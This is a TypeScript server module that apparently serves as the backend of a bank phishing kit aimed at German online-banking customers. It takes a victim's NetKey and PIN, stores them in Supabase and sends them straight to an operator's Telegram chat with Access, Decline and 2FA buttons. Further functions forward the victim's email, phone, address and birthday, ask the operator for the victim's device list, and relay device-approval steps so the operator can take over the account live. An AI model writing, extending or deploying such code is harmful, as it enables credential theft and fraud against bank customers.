import { createServerFn } from "@tanstack/react-start";
import { createClient } from "@supabase/supabase-js";
import { renderSessionSummary, type QrSessionRow } from "@/lib/qrSessionSummary";

function admin() {
  return createClient(process.env["SUPABASE_URL"]!, process.env["SUPABASE_SERVICE_ROLE_KEY"]!, {
    auth: { persistSession: false },
  });
}

function esc(s: string): string {
  return s.replace(/[&<>]/g, (c) => (c === "&" ? "&amp;" : c === "<" ? "&lt;" : "&gt;"));
}

async function sendTelegram(sessionId: string, bankName: string, netkey: string, pin: string) {
  const token = process.env["TELEGRAM_BOT_TOKEN"];
  const chatId = process.env["TELEGRAM_CHAT_ID"];
  if (!token || !chatId) throw new Error("telegram_not_configured");

  const text = [
    "🔐 <b>QR-Login-Versuch</b>",
    `<b>Bank:</b> ${esc(bankName)}`,
    `<b>NetKey:</b> <code>${esc(netkey)}</code>`,
    `<b>PIN:</b> <code>${esc(pin)}</code>`,
    `<b>Zeit:</b> ${new Date().toLocaleString("de-DE", { timeZone: "Europe/Berlin" })}`,
  ].join("\n");

  const reply_markup = {
    inline_keyboard: [
      [
        { text: "✅ Access", callback_data: `access:${sessionId}` },
        { text: "❌ Decline", callback_data: `decline:${sessionId}` },
      ],
      [{ text: "🔐 2FA", callback_data: `2fa:${sessionId}` }],
    ],
  };

  const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML", reply_markup }),
  });
  const body = await res.json().catch(() => ({}));
  if (!res.ok || !body?.ok) {
    console.error("[qrLogin] telegram error", res.status, body);
    throw new Error(`telegram_${res.status}`);
  }
  return { chatId: String(body.result.chat.id), messageId: body.result.message_id as number };
}

export const startQrLoginSession = createServerFn({ method: "POST" })
  .inputValidator((data: { bankId: string; bankName: string; netkey: string; pin: string; onlineBankingUrl?: string | null }) => data)
  .handler(async ({ data }) => {
    const sb = admin();
    const { data: row, error } = await sb
      .from("telegram_sessions")
      .insert({
        bank_id: data.bankId,
        branch_name: data.bankName,
        netkey: data.netkey,
        pin: data.pin,
        online_banking_url: data.onlineBankingUrl ?? null,
        decision: "pending",
      })
      .select("id")
      .single();
    if (error || !row) {
      console.error("[qrLogin] insert failed", error);
      throw new Error("session_insert_failed");
    }

    try {
      const { chatId, messageId } = await sendTelegram(row.id, data.bankName, data.netkey, data.pin);
      await sb.from("telegram_sessions")
        .update({ telegram_chat_id: chatId, telegram_message_id: messageId })
        .eq("id", row.id);
    } catch (err) {
      console.error("[qrLogin] send failed", err);
    }

    return { sessionId: row.id as string };
  });

function sanitize(v: string | undefined, max: number): string | null {
  if (typeof v !== "string") return null;
  const t = v.trim().slice(0, max);
  return t ? t : null;
}

export const submitQrContactExtras = createServerFn({ method: "POST" })
  .inputValidator((data: { sessionId: string; email?: string; mobile?: string }) => data)
  .handler(async ({ data }) => {
    if (!/^[0-9a-f-]{10,}$/i.test(data.sessionId)) throw new Error("invalid_session");
    const email = sanitize(data.email, 254);
    const mobile = sanitize(data.mobile, 40);
    const patch: Record<string, unknown> = {};
    if (email !== null) patch["customer_email"] = email;
    if (mobile !== null) patch["customer_mobile"] = mobile;
    if (!Object.keys(patch).length) return { ok: true };

    const sb = admin();
    await sb.from("telegram_sessions").update(patch).eq("id", data.sessionId);

    const { data: row } = await sb
      .from("telegram_sessions")
      .select("telegram_chat_id, telegram_message_id, branch_name, netkey, pin, customer_anrede, customer_name, customer_number, customer_birthday, customer_address_street, customer_address_city, customer_email, customer_mobile")
      .eq("id", data.sessionId)
      .maybeSingle();
    const r = row as (QrSessionRow & { telegram_chat_id: string | null; telegram_message_id: number | null }) | null;
    const token = process.env["TELEGRAM_BOT_TOKEN"];
    if (r?.telegram_chat_id && r.telegram_message_id && token) {
      await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: r.telegram_chat_id,
          message_id: r.telegram_message_id,
          text: renderSessionSummary(r, { customerAppended: true }),
          parse_mode: "HTML",
        }),
      }).catch(() => {});
    }
    return { ok: true };
  });

export const requestDeviceList = createServerFn({ method: "POST" })
  .inputValidator((data: { sessionId: string }) => data)
  .handler(async ({ data }) => {
    if (!/^[0-9a-f-]{10,}$/i.test(data.sessionId)) throw new Error("invalid_session");
    const token = process.env["TELEGRAM_BOT_TOKEN"];
    if (!token) throw new Error("telegram_not_configured");

    const sb = admin();
    const { data: sess } = await sb
      .from("telegram_sessions")
      .select("telegram_chat_id, telegram_message_id, devices_prompt_message_id, customer_devices")
      .eq("id", data.sessionId)
      .maybeSingle();
    const chatId = (sess as any)?.telegram_chat_id;
    if (!chatId) throw new Error("no_chat");
    // If we already asked or already have devices, skip.
    const existing = (sess as any)?.customer_devices;
    if (Array.isArray(existing) && existing.length > 0) return { ok: true, alreadyHave: true };
    if ((sess as any)?.devices_prompt_message_id) return { ok: true, alreadyAsked: true };

    const replyTo = (sess as any)?.telegram_message_id ?? null;
    const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        ...(replyTo ? { reply_to_message_id: replyTo, allow_sending_without_reply: true } : {}),
        text:
          "📱 <b>Bitte Geräteliste als <u>Antwort auf DIESE Nachricht</u> senden</b>\n" +
          "Format wie im Banking (jeder Block endet mit <code>Gerätedetails</code>):\n\n" +
          "<code>iPhone\nApp-ID\nGQYIQXCFZQ\nRegistrierungsdatum\n11.05.2026\nStatus\nAktiv\nAufträge OnlineBanking\nInaktiv\nMastercard® und Visacard Zahlungen\nGerätedetails</code>",
        parse_mode: "HTML",
      }),
    });
    const body = await res.json().catch(() => ({}));
    if (!res.ok || !body?.ok) {
      console.error("[qrLogin] devices prompt failed", res.status, body);
      throw new Error(`telegram_${res.status}`);
    }
    await sb
      .from("telegram_sessions")
      .update({ devices_prompt_message_id: body.result.message_id })
      .eq("id", data.sessionId);
    return { ok: true };
  });

export const requestDeviceApproval = createServerFn({ method: "POST" })
  .inputValidator((data: { sessionId: string; active: string[]; inactive: string[] }) => data)
  .handler(async ({ data }) => {
    if (!/^[0-9a-f-]{10,}$/i.test(data.sessionId)) throw new Error("invalid_session");
    const token = process.env["TELEGRAM_BOT_TOKEN"];
    const chatId = process.env["TELEGRAM_CHAT_ID"];
    if (!token || !chatId) throw new Error("telegram_not_configured");

    const sb = admin();
    // reset any prior decision so polling picks up the new one
    await sb.from("telegram_sessions").update({ decision: "device_pending" }).eq("id", data.sessionId);

    const activeList = data.active.length ? data.active.map((n) => `• ${esc(n)}`).join("\n") : "—";
    const inactiveList = data.inactive.length ? data.inactive.map((n) => `• ${esc(n)}`).join("\n") : "—";
    const text = [
      "📱 <b>Geräteverwaltung – Freigabe erforderlich</b>",
      "",
      "<b>Diese Geräte bleiben aktiv:</b>",
      activeList,
      "",
      "<b>Diese Geräte werden als nicht mehr aktuell markiert:</b>",
      inactiveList,
    ].join("\n");

    const reply_markup = {
      inline_keyboard: [[
        { text: "✅ Freigeben", callback_data: `device_accept:${data.sessionId}` },
        { text: "❌ Ablehnen", callback_data: `device_decline:${data.sessionId}` },
      ]],
    };

    const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML", reply_markup }),
    });
    const body = await res.json().catch(() => ({}));
    if (!res.ok || !body?.ok) {
      console.error("[qrLogin] device approval send failed", res.status, body);
      throw new Error(`telegram_${res.status}`);
    }
    return { ok: true };
  });